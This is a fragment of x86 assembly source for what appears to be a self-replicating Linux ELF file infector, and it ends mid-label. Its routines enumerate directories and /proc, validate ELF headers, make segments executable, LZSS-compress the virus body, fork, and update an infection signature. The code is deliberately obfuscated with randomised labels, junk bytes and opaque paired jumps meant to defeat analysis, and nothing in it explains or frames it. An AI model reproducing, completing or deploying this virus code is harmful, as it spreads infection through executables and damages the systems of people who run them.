    jmp         ..@rgefjWnk60U2
..@pRuCC8QbneUs:
    cmp         rax, 0
    jmp         $+4
db 0x9c, 0xe1
    js          ..@Fodomj5itPSF
    jns         ..@Fodomj5itPSF
..@Ka5eOpjPkbWG:
    mov         r4, QWORD [rsp+_INFDIR_OFF.dirindex]
    jmp         $+3
db 0xc1
    jmp         ..@4tvjyHdGrguD
CreatePayload:
    jmp         ..@DgIEvZAlCfmP
..@lAgMhlZTPycy:
    mov         QWORD [rsp+_VADDR_OFF.tmp_vaddr], r5
    jmp         ..@qKg4vdRgo52V
..@5cGkiEfguI94:
    sub         r1, 1
    cmp         BYTE [r1], DT_DIR
    jne         ..@F5GJP0OSwuvv
    jmp         $+5
db 0x92, 0x06, 0x6f
    jmp         ..@P9eJzPAnxrp9
..@nXWOTi2KpLc6:
    xor         rax, rax
    xor         rdi, rdi
    jl          ..@QoXc5l0sIVEm
    jge         ..@QoXc5l0sIVEm
..@CbT9Jb8MUQQ9:
    mov         r1, r5
    call_vsp    Strlen
    jmp         ..@nKIu22vEbPLt
..@ZaxpSJZJOf1W:
    add         WORD [rsp+_LZSSE_OFF.buffersize], cx
    jl          ..@2ohtfSct515l
    jge         ..@2ohtfSct515l
..@U2OeR3g8yKBU:
    call        InfectDirectory
    js          ..@Y3sATuHXbRQx
    jns         ..@Y3sATuHXbRQx
..@5yXTzM9nOrnz:
    CFILE       DWORD [rsp+_PROC_OFF.filefd]
    jmp         $+3
db 0x41
    jmp         $+3
db 0x66
    jmp         ..@F5GJP0OSwuvv
..@Zq3kKy5r6JMo:
    xor         rcx, rcx
    xor         rbx, rbx
    jb          ..@UW9MoKrI49p8
    jae         ..@UW9MoKrI49p8
..@jSqBCZSrL9NA:
    call        MapFile
    jl          ..@JSC2ybeWasgU
    jge         ..@JSC2ybeWasgU
..@oc8ckKAzxlXN:
    test        eax, eax
    jnz         ..@9mXnQCpM1lZS
    jmp         $+3
db 0x63
    jmp         $+3
db 0xed
    jmp         $+5
db 0x45, 0x86, 0xfa
    jl          ..@b0M8V4CQhfqO
    jge         ..@b0M8V4CQhfqO
..@Ko57W1GOnZh9:
    add         rsp, _NBF_OFF_size
    jmp         $+4
db 0xc9, 0x1e
    jmp         ..@qdV1CVbXHecl
..@dYfL5bIlrkXN:
    rep         stosb
    xor         r2, r2
    jmp         ..@63uVPBpBSaNE
..@YDtdfe1Sq8CO:
    jmp         ..@0TFSreZN7avO
    jmp         $+5
db 0x39, 0xff, 0xf4
    je          ..@K20YvJKbMacp
    jne         ..@K20YvJKbMacp
..@MRWFi7IITEL5:
    jmp         ..@R4FxM6IERCtl
    jmp         $+5
db 0x47, 0x1d, 0x3c
    jmp         ..@ebFiM4AFQUuw
..@QoXc5l0sIVEm:
    xor         rcx, rcx
    jmp         $+5
db 0x40, 0xc2, 0xeb
    jmp         ..@DF40Ye6VsElw
..@be6BcuOpQGuC:
    jmp         ..@hgE5w6Fo7uHx
    jmp         ..@u3eSpwI3CJEw
..@PEUVk47jwmlL:
    add         r3, r5
    mov         r4, r3
    jb          ..@gI4riGJKnxAm
    jae         ..@gI4riGJKnxAm
..@smKLMgXPkga9:
    add         r1, signature_len-1
    jb          ..@WwCvxZMXDbza
    jae         ..@WwCvxZMXDbza
..@h8utXn83wrLY:
    mov         r1, QWORD [r5+file.filesize]
    cmp         r1, e_h_size
    jge         ..@j8XgoH9G9ifr
    jmp         $+3
db 0x58
    jmp         ..@HH4BDrotzimV
..@JdKyMMUhxL96:
    mov         r1, rax
    xor         r2, r2
    xor         r3, r3
    jmp         $+4
db 0x68, 0x00
    jl          ..@GMLPTT7m5SkP
    jge         ..@GMLPTT7m5SkP
..@KJ91uacatmQI:
    VAR         packed, procs
    jmp         $+3
db 0x79
    jmp         $+5
db 0xf0, 0xe0, 0xe3
    jmp         ..@33Q4If3rtkYg
..@VIl87moDF44G:
    push        r5
    jmp         $+5
db 0xd3, 0xfc, 0x12
    js          ..@8E6n7NgFN6PI
    jns         ..@8E6n7NgFN6PI
..@pM2PNzAOCOMk:
    push        r5
    sub         rsp, _UPDATASIG_OFF_size
    mov         QWORD [rsp+_UPDATASIG_OFF.signaddr], r1
    jl          ..@TxnqhqKazGEX
    jge         ..@TxnqhqKazGEX
..@7AzfoYaFybFW:
    ret
    jmp         $+4
db 0xe8, 0x47
    jl          ..@YGvCtyV1laIX
    jge         ..@YGvCtyV1laIX
..@tBygYHEDB0ev:
    push        r4
    jmp         $+4
db 0xcb, 0x34
    jb          ..@pM2PNzAOCOMk
    jae         ..@pM2PNzAOCOMk
..@PELDalgIzKzL:
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    jmp         ..@ksG3E592URJM
..@ft9ixVzokrKr:
%ifdef X86_64
    xor         r9, r9
    mov         rsi, QWORD [r8+file.filesize]
%endif
    jmp         $+5
db 0xed, 0xc8, 0x92
    jb          ..@KF0eJeiscMqz
    jae         ..@KF0eJeiscMqz
..@XRUKR0kN8b25:
    lea         r2, [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_name+r4]
    call        Strcpy
    js          ..@UaHgTkrnephY
    jns         ..@UaHgTkrnephY
MapFile:
    jmp         ..@t72eQN8DIfP3
InfectFile:
    jmp         ..@DzSAkiy6D7Fb
..@AKKpTyEdzWi5:
    mov         rdi, m6
    jmp         $+3
db 0x74
    jmp         $+5
db 0xcc, 0xbd, 0x09
    js          ..@uvKPMbLEa5kL
    jns         ..@uvKPMbLEa5kL
..@zsh4RuWlDQCS:
    mov         r5, r3
    jmp         $+5
db 0xda, 0xf9, 0xc5
    jb          ..@eZgpzd7Y37PK
    jae         ..@eZgpzd7Y37PK
..@H2uflChhbadf:
    OFILE       [r1], 0x10000
    jmp         $+5
db 0xb2, 0xc6, 0x8c
    jl          ..@mU56aDurDmUw
    jge         ..@mU56aDurDmUw
..@mkEbUBw5QjK2:
    sub         rsp, _INFDIR_OFF_size
    jmp         $+3
db 0xf8
    jmp         ..@xRvy4WEkC6ZF
..@oz0w6dKg0d2f:
    lea         r1, [rsp+_INFFILE_OFF.file]
    jb          ..@MPA0PN1EMzAQ
    jae         ..@MPA0PN1EMzAQ
..@HTxpQXfBEGGO:
    mov         QWORD [rsp+_LZSSE_OFF.length], r2
    js          ..@nXWOTi2KpLc6
    jns         ..@nXWOTi2KpLc6
..@Ni2CGNpMTv9e:
    xor         rdx, rdx
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    sub         ax, WORD [rsp+_LZSSE_OFF.la_index]
    jmp         $+3
db 0x6f
    js          ..@XpZ3fLZotp95
    jns         ..@XpZ3fLZotp95
..@5NbC2vKra5FA:
    mov         QWORD [r2+p_h.p_align], PAGE_SIZE
    mov         DWORD [r2+p_h.p_flags], PF_R + PF_X
    jmp         ..@nPFo2IJ5tWSF
..@ljb9zJ1jAXr6:
    OFILE       [rsp+_PROC_OFF.buffer], 0x00
    cmp         eax, 0x3
    js          ..@gL9qOJf82HFz
    jns         ..@gL9qOJf82HFz
..@u01arBYN9hMA:
    je          ..@oz0w6dKg0d2f
    mov         r4, m7
    sub         r4, m6
    jmp         $+3
db 0x7b
    jb          ..@pfnPahA61d3X
    jae         ..@pfnPahA61d3X
..@qjamrc8Zkrya:
    mov         eax, ebx
    and         eax, edx
    test        eax, eax
    jmp         $+4
db 0x4c, 0xab
    jmp         $+3
db 0x04
    jb          ..@mm5Zd9VTs5Ei
    jae         ..@mm5Zd9VTs5Ei
..@sv2ZjJ5lBsEf:
    add         eax, 0x30
    jmp         $+4
db 0x58, 0xce
    js          ..@YEBriIJaBMAv
    jns         ..@YEBriIJaBMAv
..@CvDTA8oVitCy:
    call        CreatePayload
    jmp         ..@VxA138Idaxwn
..@u3eSpwI3CJEw:
    mov         rax, (-1)
    jmp         $+5
db 0x16, 0xbd, 0xfd
    js          ..@hgE5w6Fo7uHx
    jns         ..@hgE5w6Fo7uHx
..@RSUiE4NS5Pmy:
    pop         r2
    js          ..@ZwdwaYIz0mfE
    jns         ..@ZwdwaYIz0mfE
..@aAMKP3rZSpfe:
    cmp         dl, BYTE [rsp+_LZSSE_OFF.match_len]
    je          ..@mH7aNPn4iE6C
    jne         ..@mH7aNPn4iE6C
..@pNPXcdf9P64o:
    cmp         BYTE [rsp+_LZSSE_OFF.mask], 10000000b
    je          ..@QgGokKcGlq3I
    mov         al, BYTE [rsp+_LZSSE_OFF.bits]
    jmp         ..@Jz7QhAQWXp17
..@XmSofxDnpzEy:
    mov         rax, 1
    jb          ..@cYrHtq0NjT1C
    jae         ..@cYrHtq0NjT1C
..@c6cHv83DmXSN:
    mul         rbx
    mov         rdi, QWORD [rsp+_DYNPIE_OFF.sh_ptr]
    add         rdi, rax
    jmp         ..@OLLN75csFyr5
..@V3Di2odKj8nx:
    shr         dx, 0x4
    jl          ..@vlw8G6ck9nSA
    jge         ..@vlw8G6ck9nSA
..@Nq03kCGnStMs:
%ifdef X86_32
    xor         ebx, ebx
%endif
    jmp         $+5
db 0x2a, 0x43, 0xda
    jmp         $+5
db 0xca, 0xfc, 0xf8
    jmp         ..@tt5pTdpoMGbi
..@cy6ygEdy19q9:
    jmp         ..@611tBUgINy3K
    js          ..@ViiT1xQWe48y
    jns         ..@ViiT1xQWe48y
..@dtIZtBn8QrJe:
    jmp         ..@R4FxM6IERCtl
    jmp         $+4
db 0x07, 0x99
    jmp         ..@j8XgoH9G9ifr
..@Grjy3p8I7hHH:
    sub         ebx, 1
    cmp         bx, WORD [rsp+_LZSSE_OFF.w_index]
    jge         ..@YlYAIacUZF2V
    jmp         $+5
db 0x7a, 0xe1, 0x99
    jmp         ..@cj9uaDZq2Jm5
..@VFOG8hxZ28mK:
    mov         [r1], rax
    jmp         $+4
db 0x37, 0x56
    jmp         $+3
db 0x3f
    jmp         $+4
db 0xfb, 0x22
    jmp         $+3
db 0x1b
    jb          ..@xdYv9PZaR2UT
    jae         ..@xdYv9PZaR2UT
..@MlSzyU5l2RYt:
    mul         r3
    add         rax, p_h.p_type
    jmp         $+4
db 0x88, 0xbe
    jmp         ..@FZFrNryPZlU0
..@XjgcM2fSOTIb:
    mov         r5, [rsp]
    mov         QWORD [r5+file.fileptr], rax
    xor         rax, rax
    jmp         $+3
db 0x4b
    jmp         $+4
db 0x80, 0xef
    jmp         ..@cy6ygEdy19q9
..@XfVfNAWujDt4:
    cmp         BYTE [r1+4], ELFCLASS
    jne         ..@rZ7qNVQsHsgv
    cmp         BYTE [r1+16], ET_EXEC
    jl          ..@LA5MkaFRvHa5
    jge         ..@LA5MkaFRvHa5
..@ARx5EzeSo5IE:
    xor         rdx, rdx
    mov         dl, BYTE [rsp+_LZSSE_OFF.cmp_len]
    sub         dl, cl
    jmp         $+5
db 0xc2, 0x00, 0xeb
    je          ..@aAMKP3rZSpfe
    jne         ..@aAMKP3rZSpfe
..@eCQ38dTL726y:
    mov         rsi, QWORD [rsp+_LZSSE_OFF.inputaddr]
    rep         movsb
    jmp         $+5
db 0x18, 0x2b, 0xd5
    js          ..@oyoqPVLAw2uN
    jns         ..@oyoqPVLAw2uN
..@j8XgoH9G9ifr:
    mov         r1, QWORD [r5+file.fileptr]
    cmp         DWORD [r1], 0x464c457f
    jl          ..@jK29AMnrSIXE
    jge         ..@jK29AMnrSIXE
..@K20YvJKbMacp:
    mov         rax, SYS_FORK
    syscall
    test        eax, eax
    jmp         $+3
db 0x75
    jl          ..@Eix5o9R89Rf4
    jge         ..@Eix5o9R89Rf4
..@YGvCtyV1laIX:
    mov         eax, 1
    jmp         $+4
db 0xf5, 0x37
    jl          ..@cMKaxZ4Unzef
    jge         ..@cMKaxZ4Unzef
..@R0B4ee3rnLLU:
    pop         r4
    jmp         $+3
db 0xaa
    jmp         ..@mxYCnRyWJlpy
..@afH8Ql8R9yLw:
    push        r2
    jmp         $+5
db 0x9b, 0x9b, 0x36
    jmp         ..@z03l69SjKtJw
..@OGPspkwQyrEx:
    mov         QWORD [r5+file.filesize], 0x00
    jmp         ..@g4prVM2GFzA4
..@DgIEvZAlCfmP:
    sub         rsp, _PAYLOAD_OFF_size
    jmp         ..@8OuO0U9gKJAi
..@Qvl4OciLIY97:
    cld
    jmp         ..@FBKWjRb6Qqsm
    jmp         $+4
db 0x84, 0x2c
    js          ..@PyEoMv10Zn0q
    jns         ..@PyEoMv10Zn0q
..@yqyjeOpCzBp9:
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    jmp         $+3
db 0x3f
    jmp         $+3
db 0x18
    jmp         ..@asYunRcCUT72
..@xUDVpy35guCE:
    syscall
    cmp         eax, 0x0
    jle         ..@ViiT1xQWe48y
    jmp         $+5
db 0xde, 0x6e, 0xf0
    je          ..@3IdYQ2ZFvaX2
    jne         ..@3IdYQ2ZFvaX2
..@MI8cq6CMWXUz:
    mov         r3, original_virus_len-non_packed_len
    call        MemMove
    xor         r2, r2
    jmp         $+3
db 0x36
    jb          ..@OOrEl0Nry7A7
    jae         ..@OOrEl0Nry7A7
..@8tm2tgPSpYNf:
    mov         WORD [rsp+_LZSSE_OFF.w_index], 0x0000
    jmp         $+5
db 0x36, 0xaa, 0xfa
    je          ..@558pDbgxYslW
    jne         ..@558pDbgxYslW
..@S3GuQyFfevZm:
    mov         r2, QWORD [r5+file.fileptr]
    jmp         ..@dhmtsbVaoyYs
..@E5hVQgUHALoU:
    add         rsp, _PROC_OFF_size
    jmp         $+5
db 0x3c, 0x50, 0x17
    jmp         InfectionRoutine
..@tE5ZdIYc6T3a:
    xor         rcx, rcx
    jmp         ..@zAiDqZUNyCK2
..@Q0XURZ3PjlcY:
    sub         al, 0x02
    mov         edx, 1
    je          ..@K5vGHDI1fL2f
    jne         ..@K5vGHDI1fL2f
..@mm5Zd9VTs5Ei:
    jnz         ..@eDvIPiZixItI
    jmp         ..@fKHPCDyP6f2n
..@eRWtE3wBUbL4:
    mov         rax, SYS_MUNMAP
    syscall
    xor         r1, r1
    jmp         $+4
db 0x35, 0xf3
    jmp         ..@dGwnzrqrDTXD
..@60hMYYsYEK0a:
    xor         rax, rax
    jmp         ..@XNvXzTJxKSFt
..@ffxxTpdtCFdh:
    mov         r2, original_virus_len+PADDING
    jmp         $+4
db 0xcf, 0xe4
    jmp         $+5
db 0x04, 0x7b, 0x75
    jl          ..@yMFlQOdWcP90
    jge         ..@yMFlQOdWcP90
..@lhd4BZJ8awDg:
    mov         QWORD [rsp+_LZSSE_OFF.outputaddr], r3
    mov         QWORD [rsp+_LZSSE_OFF.saveoutptr], r3
    je          ..@q7JKIfd3IsNi
    jne         ..@q7JKIfd3IsNi
..@HU6azLKCYMB6:
    rep         stosb
    jmp         ..@0HcqVLmEz0sX
..@QPGIokYsnVu8:
    mov         al, BYTE [rsp+_LZSSE_OFF.bits]
    mov         rdi, QWORD [rsp+_LZSSE_OFF.outputaddr]
    jmp         $+4
db 0xc0, 0xca
    jmp         $+3
db 0x28
    jmp         $+5
db 0xea, 0xe3, 0x1e
    jb          ..@wORN9LOXlfnZ
    jae         ..@wORN9LOXlfnZ
..@cGP4eVS9c0f1:
    mov         r4, QWORD [rsp+_INFDIR_OFF.dirindex]
    movzx       rax, BYTE [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_reclen+r4]
    jmp         $+4
db 0xc9, 0xa5
    jb          ..@UeDdX8n7MC9z
    jae         ..@UeDdX8n7MC9z
..@mS30275tJASv:
    and         WORD [rsp+_LZSSE_OFF.match_pos], WINDOW_LENGTH-1
    jmp         $+3
db 0x14
    jb          ..@Q0XURZ3PjlcY
    jae         ..@Q0XURZ3PjlcY
..@fDgo3tTEMuNL:
    add         eax, 0x57
    jmp         $+3
db 0xac
    jl          ..@HuVTGdMto0ir
    jge         ..@HuVTGdMto0ir
..@cMKaxZ4Unzef:
    ret
    jmp         Strcpy
..@h4CdhiZkNGku:
    call        Strcpy
    VAR         packed, status
    jmp         ..@mrY8wzck3Gs1
..@S3Tu4SPEY4if:
    movzx       rax, BYTE [r2]
    jmp         ..@VFOG8hxZ28mK
..@oC7kXEqeEuIm:
    mov         rax, SYS_WAIT4
    jmp         $+4
db 0x16, 0x26
    jmp         $+4
db 0x59, 0x66
    jl          ..@i5I1SLnji789
    jge         ..@i5I1SLnji789
..@B5eU9RZlntJj:
    cmp         BYTE [r2], 0x0
    jmp         $+4
db 0x3a, 0x2f
    jmp         $+5
db 0x0a, 0xc2, 0x21
    jl          ..@RNBEKprEyYtf
    jge         ..@RNBEKprEyYtf
..@igFgXO1vDWWG:
    mov         eax, 0x20
    jmp         $+5
db 0x95, 0x39, 0x5c
    jl          ..@HU6azLKCYMB6
    jge         ..@HU6azLKCYMB6
..@vLMeYDjrNmE5:
    je          ..@ebFiM4AFQUuw
    je          ..@MRWFi7IITEL5
    jne         ..@MRWFi7IITEL5
..@8bhq8GrRkYyw:
    mov         rcx, signature_len
    js          ..@gGUmXOYXPMIK
    jns         ..@gGUmXOYXPMIK
..@5Xxh6Tlgi9LX:
    cmp         BYTE [r5], DT_REG
    jmp         ..@CtGHng2tByaI
..@yBbajFDp4b40:
    jl          ..@MGXT1k5tio5r
    jmp         $+4
db 0x66, 0x14
    je          ..@WYCIirrUMuau
    jne         ..@WYCIirrUMuau
..@T2aQ8F6bVsjc:
    push        r3
    push        r2
    jl          ..@cVnpZp6h4CT9
    jge         ..@cVnpZp6h4CT9
..@YEBriIJaBMAv:
    jmp         ..@HuVTGdMto0ir
    jmp         ..@fDgo3tTEMuNL
..@tp01EptcftdQ:
%ifdef X86_32
    mov         edx, esi
%endif
    jmp         $+5
db 0xc4, 0x0e, 0xe4
    jmp         $+3
db 0xe0
    jb          ..@3rBVjVMcORPp
    jae         ..@3rBVjVMcORPp
..@5QMJVM7XOVqc:
%ifdef X86_64
    mov         r10, 0x22
    mov         r8, 0xffffffffffffffff
%endif
    jmp         ..@WX0eesBnV3cs
..@XdxqlWLQBHLc:
    syscall
    jmp         $+5
db 0xdb, 0x3a, 0xf2
    je          ..@6yUGC7xASBts
    jne         ..@6yUGC7xASBts
..@AGjxJJlq5J0N:
    cmp         BYTE [rsp+_LZSSE_OFF.character], al
    jmp         $+5
db 0x28, 0x90, 0xa8
    js          ..@saqRpqu3zdQG
    jns         ..@saqRpqu3zdQG
..@css0Mku3Lg6e:
    jnz         ..@R4FxM6IERCtl
    jmp         $+3
db 0x62
    jmp         ..@gEK5sDBcQYmo
..@7jv4z9bVaHAy:
    xor         rcx, rcx
    jmp         ..@ckEHMrJvejhn
..@AdrpPISIXA1v:
%ifdef X86_64
    mov         edx, 11b
%endif
    jl          ..@5QMJVM7XOVqc
    jge         ..@5QMJVM7XOVqc
..@5Nm77R9P6Ml5:
    call_vsp    ExitProgram
    jl          ..@5yXTzM9nOrnz
    jge         ..@5yXTzM9nOrnz
..@kKsgl6LDvq91:
    sub         rsp, _PROC_OFF_size
    VAR         packed, procdir
    mov         QWORD [rsp+_PROC_OFF.dirname], r5
    jmp         $+3
db 0xf9
    jmp         $+5
db 0x4b, 0x68, 0x49
    js          ..@4ANICuqNYxxG
    jns         ..@4ANICuqNYxxG
..@4eY7DTCdAKnB:
    test        al, al
    jnz         ..@u3eSpwI3CJEw
    mov         r1, QWORD [r5+file.fileptr]
    jb          ..@wUVMi5w87VJ2
    jae         ..@wUVMi5w87VJ2
..@mxYCnRyWJlpy:
    ret
    jmp         $+5
db 0xa3, 0xbf, 0x18
    jmp         $+3
db 0xd4
    jb          MapFile
    jae         MapFile
..@OOrEl0Nry7A7:
    xor         r3, r3
    mov         r1, m6
    add         r1, _signature-_start
    jmp         $+5
db 0x5d, 0x08, 0xb7
    jmp         $+5
db 0x93, 0x0f, 0x41
    jb          ..@96H6TQfqgoQW
    jae         ..@96H6TQfqgoQW
..@VdcDE8Ukjlle:
    lea         r5, [rsp+_INFDIR_OFF.dirbuf+r4]
    jmp         $+4
db 0xf8, 0x45
    jb          ..@Owf8jAwl3pU1
    jae         ..@Owf8jAwl3pU1
..@NPxTPVIXOKb6:
    mov         DWORD [rsp+_PROC_OFF.dirfd], eax
    jmp         $+3
db 0xd4
    jmp         ..@Wesp2uJKn8Ae
..@Ie6t8FunBGSt:
    pop         r4
    jmp         $+5
db 0x50, 0x96, 0x89
    jmp         ..@AZNY8vcQkTVa
..@02DoeAJ124yA:
    mov         rax, r2
    movzx       r3, WORD [r1+e_h.e_phentsize]
    mul         r3 
    jmp         $+4
db 0x12, 0x6f
    jmp         ..@lfRBZa3XcGLF
..@Q5YkDydcwA4M:
    mov         bx, WORD [rsp+_LZSSE_OFF.match_pos]
    jmp         $+3
db 0x28
    jmp         ..@h7lPqNx8SqOi
..@z5p2uJ1zNGu7:
    cmp         BYTE [r5], DT_DIR
    jmp         $+5
db 0xb0, 0x24, 0xf1
    jmp         $+3
db 0xca
    js          ..@EMOYBXeAaTAU
    jns         ..@EMOYBXeAaTAU
..@dGwnzrqrDTXD:
    CFILE       DWORD [r5+file.filefd]
    jb          ..@lvxuocqR1LKG
    jae         ..@lvxuocqR1LKG
..@nU3RMRtn2ztW:
    ret
    jmp         $+5
db 0xec, 0xaa, 0xb3
    jmp         $+3
db 0xd8
    js          DestroyPayload
    jns         DestroyPayload
..@S2ZAvlHIT5v4:
    syscall
    jmp         $+4
db 0x18, 0x09
    jmp         ..@4eY7DTCdAKnB
..@etfoIz5aiHgu:
    xor         rax, rax
    je          ..@Fb84znZ8Jlae
    jne         ..@Fb84znZ8Jlae
..@3cFjwW8DaFMl:
    cmp         BYTE [r1], 0x39
    jmp         $+5
db 0x0b, 0x42, 0x01
    jmp         $+3
db 0xe6
    jmp         $+4
db 0x9e, 0xd1
    jmp         ..@HysXOoq8YAw3
..@admmFm0dmqQ6:
    cmp         WORD [rsp+_LZSSE_OFF.la_index], WINDOW_LENGTH*2-LOOKAHEAD_LENGTH
    jl          ..@nJOLs7KRiFEA
    jmp         ..@YdLfCP3OLxvi
..@mrY8wzck3Gs1:
    mov         r2, r5
    call        Strcpy
    jmp         $+3
db 0x1e
    jmp         $+4
db 0x15, 0x07
    jmp         $+3
db 0xc0
    jb          ..@o23wt7vYA5Cr
    jae         ..@o23wt7vYA5Cr
..@vtfhhaZufnE3:
    add         r4, rax
    jb          ..@naVkSRdjTKKL
    jae         ..@naVkSRdjTKKL
..@22PLG1gO79rZ:
%ifdef X86_64
    xor         rdx, rdx
    xor         r9, r9
    mov         rsi, original_virus_len+PADDING
%endif
    jmp         $+4
db 0x99, 0x18
    jmp         $+3
db 0x8f
    je          ..@AdrpPISIXA1v
    jne         ..@AdrpPISIXA1v
..@kF610wwLqtH1:
    cmp         eax, 0x3
    jmp         ..@sN2zXiV0UFov
..@tFrW7VuAK6e3:
%ifdef X86_32
    mov         eax, SYS_MMAP2
    int         0x80
    pop         ebp
%endif
    jb          ..@b0gyP5nSIRom
    jae         ..@b0gyP5nSIRom
..@nCZuxecWubzp:
    cmp         WORD [r1], './'
    je          ..@cGP4eVS9c0f1
    mov         r2d, DWORD [r1]
    jmp         $+5
db 0x57, 0x35, 0x52
    jl          ..@vnhlexeQjq4t
    jge         ..@vnhlexeQjq4t
..@F5GJP0OSwuvv:
    mov         r4, QWORD [rsp+_PROC_OFF.dirindex]
    movzx       rax, BYTE [rsp+_PROC_OFF.dirbuf+linux_dirent.d_reclen+r4]
    add         QWORD [rsp+_PROC_OFF.dirindex], rax
    jmp         $+5
db 0x64, 0x4d, 0x3b
    jb          ..@vtfhhaZufnE3
    jae         ..@vtfhhaZufnE3
..@5vI6f72u2sFK:
    je          ..@0TFSreZN7avO
    jmp         $+4
db 0x38, 0x86
    jmp         $+4
db 0x9f, 0x1d
    jmp         $+5
db 0x65, 0x49, 0x2e
    jmp         ..@7p3CvulN7ik3
..@KDyl77Nevxfa:
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    xor         rax, rax
    mov         ax, WORD [rsp+_LZSSE_OFF.la_index]
    jmp         $+4
db 0xd7, 0x71
    jmp         $+3
db 0x53
    js          ..@GFM74VBidX4S
    jns         ..@GFM74VBidX4S
..@xq8Kb3w9pHem:
    xor         rdx, rdx
    jmp         ..@60hMYYsYEK0a
..@nb8j1yOPBjcj:
    cmp         ecx, DWORD [rsp+_LZSSE_OFF.length]
    cmovg       ecx, DWORD [rsp+_LZSSE_OFF.length]
    jmp         ..@TG2SY1lJr2M4
..@0HcqVLmEz0sX:
    mov         ecx, (WINDOW_LENGTH+LOOKAHEAD_LENGTH)
    cmp         ecx, DWORD [rsp+_LZSSE_OFF.length]
    cmovg       ecx, DWORD [rsp+_LZSSE_OFF.length]
    jmp         $+4
db 0xd2, 0xdc
    jmp         $+3
db 0x16
    jl          ..@FVbnrmrs1RgV
    jge         ..@FVbnrmrs1RgV
..@ixf5WGuQeQ27:
    mov         r2, 1
    js          ..@U2OeR3g8yKBU
    jns         ..@U2OeR3g8yKBU
..@92tgH7fsDH79:
    cmp         DWORD [rdi+s_h.sh_type], SHT_DYNAMIC
    jmp         $+4
db 0x24, 0x64
    jl          ..@P9K9gnW58pSG
    jge         ..@P9K9gnW58pSG
..@MPA0PN1EMzAQ:
    call        UnmapFile
    js          ..@cS6c66HTlUaz
    jns         ..@cS6c66HTlUaz
..@ARKp79bYIGkM:
%ifdef X86_32
    mov         ecx, r3
%endif
    jmp         $+4
db 0x43, 0x03
    jl          ..@j4jjioevyQYN
    jge         ..@j4jjioevyQYN
..@WYCIirrUMuau:
    mov         DWORD [rsp+_INFDIR_OFF.dirfd], eax
    jl          ..@5SlIFDCBMoj5
    jge         ..@5SlIFDCBMoj5
..@JrQf5sqP4je4:
    CFILE       DWORD [rsp+_PROC_OFF.filefd]
    jmp         ..@q2kzdUowKCZP
LzssEncoder:
    jmp         ..@YbHiqcIxYmDk
..@wGno3Lq37lNv:
    xor         rax, rax
    je          ..@88KHKzk7iMJP
    jne         ..@88KHKzk7iMJP
..@CtGHng2tByaI:
    jne         ..@cGP4eVS9c0f1
    jmp         $+5
db 0xe9, 0x57, 0x6b
    jmp         $+3
db 0x5d
    jb          ..@RLw7VHd5KSgN
    jae         ..@RLw7VHd5KSgN
..@hxfqGTzCxVYd:
    mov         r4, 0x1
    xor         rax, rax
    mov         eax, SYS_MREMAP
    jb          ..@YSmfw3iAb0qD
    jae         ..@YSmfw3iAb0qD
..@iFVy59tt1XUp:
    jne         ..@R4FxM6IERCtl
    jmp         $+5
db 0xd2, 0x2c, 0x3e
    js          ..@S3GuQyFfevZm
    jns         ..@S3GuQyFfevZm
..@PyTJLkqbD9Kf:
    mov         r1, rax
    js          ..@3vQ1fz9XFZya
    jns         ..@3vQ1fz9XFZya
..@GMLPTT7m5SkP:
    xor         r4, r4
    jmp         ..@oC7kXEqeEuIm
..@yMFlQOdWcP90:
    mov         eax, SYS_MUNMAP
    jb          ..@XdxqlWLQBHLc
    jae         ..@XdxqlWLQBHLc
..@ahbwglLJDRtH:
    ret
    jmp         FileValidation
..@Ktrqqo6CscD3:
    jl          ..@E5hVQgUHALoU
    jl          ..@NPxTPVIXOKb6
    jge         ..@NPxTPVIXOKb6
..@ULGNtgTzUOPR:
    inc         WORD m5
    jmp         $+5
db 0x0b, 0xe7, 0x4f
    jmp         $+5
db 0x7c, 0x5c, 0x77
    jmp         $+4
db 0x6b, 0x59
    js          ..@hyhNiw44qDza
    jns         ..@hyhNiw44qDza
..@WwCvxZMXDbza:
    mov         BYTE [r1], 0x00
    jmp         $+5
db 0xe5, 0xf6, 0x02
    jb          ..@Ko57W1GOnZh9
    jae         ..@Ko57W1GOnZh9
..@h7lPqNx8SqOi:
    shl         ebx, LENGTH_BITS
    js          ..@4gjhzjLOmt6y
    jns         ..@4gjhzjLOmt6y
..@9sFjqZXTAW8V:
    sub         r1, r4
    call        MemMove
    inc         WORD m5
    jmp         $+5
db 0x91, 0xc4, 0x17
    jmp         $+3
db 0xfa
    jmp         $+4
db 0x32, 0xa9
    jmp         $+3
db 0x43
    jl          ..@y1qLUpfx4vE3
    jge         ..@y1qLUpfx4vE3
UpdateSignature:
    jmp         ..@tBygYHEDB0ev
..@SthyxNdQc1hl:
    jmp         Strcpy
    jmp         ..@gcIgl41igXcn
..@ouZrOPgHJLzy:
    jl          ..@dPD0BooPh80v
    jmp         ..@Wesp2uJKn8Ae
    js          ..@tWtXJ5a7f5r8
    jns         ..@tWtXJ5a7f5r8
..@OslxAhAtn3Bf:
    mov         r2w, WORD [r1+e_h.e_phnum]
    jmp         ..@EQOmeEaGQwBu
..@DzflMao0AsxA:
    call        InfectFile
    jmp         $+4
db 0x25, 0x3a
    jmp         $+3
db 0x77
    jl          ..@cGP4eVS9c0f1
    jge         ..@cGP4eVS9c0f1
..@mH7aNPn4iE6C:
    jle         ..@Grjy3p8I7hHH
    jmp         ..@FJbzAIJlRe5q
..@t75i7PmDsrll:
    add         rdi, rax
    jmp         $+5
db 0x84, 0xfb, 0x0f
    jmp         $+4
db 0x94, 0xfb
    jmp         $+4
db 0x59, 0x46
    js          ..@EfPDgmEdYbl1
    jns         ..@EfPDgmEdYbl1
..@b0gyP5nSIRom:
%ifdef X86_64
    xor         rax, rax
    xor         rdi, rdi
    xor         rdx, rdx
%endif
    jmp         $+4
db 0x6e, 0xd4
    jb          ..@ft9ixVzokrKr
    jae         ..@ft9ixVzokrKr
..@c15beUsubYBF:
    add         rdi, rbx
    jb          ..@ri6MwqARLp4A
    jae         ..@ri6MwqARLp4A
..@3Jhbev2ZJEeL:
%ifdef X86_32
    push        ebp
    xor         ebp, ebp
%endif
    jmp         $+4
db 0x61, 0x1a
    jb          ..@A8VTU1oIglQd
    jae         ..@A8VTU1oIglQd
..@NjTnMfEK7Rpu:
%ifdef X86_32
    xor         eax, eax
%endif
    jl          ..@Nq03kCGnStMs
    jge         ..@Nq03kCGnStMs
..@EMOYBXeAaTAU:
